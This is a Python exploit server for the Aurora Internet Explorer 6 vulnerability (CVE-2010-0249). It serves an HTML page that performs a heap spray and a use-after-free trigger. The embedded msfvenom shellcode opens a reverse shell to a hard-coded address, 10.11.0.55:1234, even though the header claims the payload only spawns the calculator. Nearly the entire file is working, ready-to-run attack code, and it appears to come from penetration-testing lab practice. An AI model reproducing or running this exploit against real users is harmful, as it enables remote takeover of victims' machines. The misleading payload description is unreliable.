#!/usr/bin/python
print """
##//#############################################################################################################
##							##							#
## Vulnerability: Aurora Exploit 			##  This program acts as a web server that generates an	#
## 							##  exploit to target a vulnerability (CVE-2010-0249)	#
## Vulnerable Application: Microsoft Internet Explorer 6##  in Internet Explorer.		 		#
## Tested on  Internet Explorer 6 win xp 		##  							#
##							##   							#
## Modified: Muhammad Haidari				##  The exploit's payload spawns the calculator.	#
## Contact: ghmh@outlook.com				##							#
## Website: www.github.com/muhammd			##  Author : Ahmed Obied (ahmed.obied@gmail.com)	#
##							##							#
##//#############################################################################################################
##
##
## TODO: adjust 
##
## Usage: python ie_aurora.py [port number]
"""


import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload
                
    def get_payload(self):
  # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.55 LPORT=1234 EXITFUNC=process -b "\x00" -f js_le    
	payload = "%ud5db%u74d9%uf424%u20bb%ua2d2%u5aa8%uc92b%u52b1%uea83%u31fc%u135a%u7a03%u40c1%u865d%u060d%u769e%u67ce%u9316%ua7ff%ud04c%u1850%ub406%ud35c%u2c4a%u91d6%u4342%u1f5f%u6ab5%u0c60%ued85%u4fe2%ucdda%u9fdb%u0c2f%ufd1b%u5cc2%u89f4%u7071%uc771%ufb49%uc9c9%u18c9%ue899%u8ff8%ub291%u2eda%ucf75%u2852%uea9a%uc32d%u8068%u05af%u69a1%u6803%u980d%uad5d%u43aa%uc728%ufec8%u1c2b%u24b2%u86b9%uae14%u6219%u63a4%ue1ff%uc8aa%uad8b%ucfae%uc658%u44cb%u085f%u1e5a%u8c44%uc406%u95e5%uabe2%uc51a%u134c%u8ebf%u4061%ucdb2%ua5ed%uedff%ua1ed%u9e88%u6edf%u0823%ue66c%ucfed%udd93%u5f4a%ude6a%u76aa%u8aa9%ue0fa%ub318%uf090%u66a5%ua036%ud909%u10f7%u89ea%u7a9f%uf6e5%u8580%u9f2f%u7c2b%uaab8%u7ea0%uc30f%u7eb4%uc16b%u9830%uf519%u3314%u6cb6%ucf3d%u7027%uaaeb%ufa68%u4b18%u0b26%u5f54%ufbdf%u3d23%u0376%u299e%u9614%ua945%u8b53%ufed1%u7d34%u6a28%u24a9%u8882%ub030%u08ed%u01ef%u91f3%u3d62%u81d7%ubeba%uf553%ue912%ua30d%u43d4%u1dfc%u388f%uc956%u7356%u8f69%u5e56%u6f1f%u37e6%u9066%udfc7%ue96e%u4035%u2090%u70fe%u68db%u1957%uf982%u44e5%ud435%u712a%udcb6%u86d2%u95a6%uc3d7%u4660%u5caa%u6805%u5c19%u410c"

	return payload
    
    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>
            
            var obj, event_obj;
            
            function spray_heap()
            {
                var chunk_size, payload, nopsled;
            
                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);        
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }
        
            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }
        
            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }
      
            function ev2()
            {
                var data, tmp;
                
                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }
                    
            function check()
            
		{
                document.write(navigator.userAgent);
                return true;   
            }
            
            if (check()) {
                initialize();
                spray_heap();               
            }
            else
                window.location = 'about:blank'
                
            </script>
        </head>
        <body>
		<h2> Hello </h2>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>        
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit 

    def get_image(self):
        content  = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass
        
    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200) 
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
		self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]
            elif self.path == '/aurora.gif':      
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())
        except: 
            print '[*] Error : an error has occured while serving the HTTP request'
            print '[-] Exiting ...'
            sys.exit(-1)
            
                       
def main():
    if len(sys.argv) != 2:
        print 'Usage: %s [port number (between 1024 and 65535)]' % sys.argv[0]
        sys.exit(0)
    try:
        port = int(sys.argv[1])
        if port < 1024 or port > 65535:
            raise ValueError
        try:
            serv = HTTPServer(('', port), RequestHandler)
            ip = socket.gethostbyname(socket.gethostname())
            print '[-] Web server is running at http://%s:%d/' % (ip, port)
            try:
                serv.serve_forever()
            except:
                print '[-] Exiting ...' 
        except socket.error:
            print '[*] Error : a socket error has occurred'
        sys.exit(-1)    
    except ValueError:
        print '[*] Error : an invalid port number was given'
        sys.exit(-1)
            
if __name__ == '__main__':
    main()
